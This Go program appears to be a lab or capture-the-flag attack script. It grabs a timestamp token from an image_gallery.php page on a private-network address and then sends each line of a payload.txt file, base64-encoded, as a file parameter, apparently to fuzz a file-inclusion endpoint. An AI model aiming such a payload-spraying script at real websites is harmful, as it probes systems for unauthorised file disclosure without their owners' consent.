package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func main2() {
	decode := base64.StdEncoding.EncodeToString([]byte("123"))

	fmt.Println(decode)
}

func main() {
	url := "http://192.168.1.7/image_gallery.php"
	response, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()
	body, err := io.ReadAll(response.Body)
	timeStamp := findMustCompile(body)[0][1]
	fmt.Println("time stamp:", string(timeStamp))

	f, err := os.Open("payload.txt")
	if err != nil {
		fmt.Println("err:", err)
		return
	}
	defer f.Close()

	for _, item := range readTxt2(f) {
		item := strings.Trim(strings.Trim(string(item), "\r"), "\n")
		//fmt.Println(index)
		//fmt.Println(item)
		base64Payload := base64.StdEncoding.EncodeToString([]byte(item))
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println("NewRequest error: ", err)
		}
		q := req.URL.Query()
		q.Add("t", string(timeStamp))
		q.Add("f", string(base64Payload))
		req.URL.RawQuery = q.Encode()
		var resp *http.Response
		resp, err = http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println("network request error:", err)
		}
		//fmt.Println(resp.Body)
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("read response body err: ", err)
		}
		fmt.Println("repsone body: ", string(body))
		defer resp.Body.Close()

	}
	//if err != nil {
	//	fmt.Println("err:", err)
	//	return
	//}
	//for index, item := range content {
	//	fmt.Println(index)
	//	fmt.Println(item)
	//}
	//fmt.Println("content:", content)
}

func readTxt2(r io.Reader) []string {
	scanner := bufio.NewScanner(r)
	var payloads []string
	for scanner.Scan() {
		//fmt.Println(scanner.Text())
		payloads = append(payloads, scanner.Text())
	}
	//for index, item := range payloads {
	//	fmt.Println(index)
	//	fmt.Println(item)
	//}
	return payloads
}

func readTxt(r io.Reader) ([]string, error) {
	reader := bufio.NewReader(r)
	l := make([]string, 0, 64)
	for {
		line, _, err := reader.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			} else {
				return nil, err
			}
		}
		l = append(l, strings.Trim(string(line), " "))
	}
	return l, nil
}

func findMustCompile(targetString []byte) [][][]byte {
	flysnowRegexp := regexp.MustCompile(`t=(.*?)&f`)
	return flysnowRegexp.FindAllSubmatch(targetString, -1)
}
